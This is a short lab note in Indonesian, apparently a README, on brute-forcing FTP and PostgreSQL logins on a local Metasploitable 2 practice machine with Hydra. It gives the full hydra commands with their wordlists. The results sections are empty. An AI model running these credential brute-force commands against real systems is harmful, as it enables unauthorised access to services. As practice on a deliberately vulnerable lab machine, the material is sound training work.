# Hydra
- IP Metasploitable 2 di local: 192.168.1.114

## Brute Force FTP Credentials
- Gunakan perintah: `hydra -L user-metasploitable2.txt -P password-metasploitable2.txt 192.168.1.114 ftp`
- Username dan password yang ditemukan:

- Melakukan akses ke FTP Server:

## Brute Force PostgreSQL Credentials
- Gunakan perintah: `hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt 192.168.1.114 postgres`
- Username dan password yang ditemukan:

- Melakukan akses ke PostgreSQL:

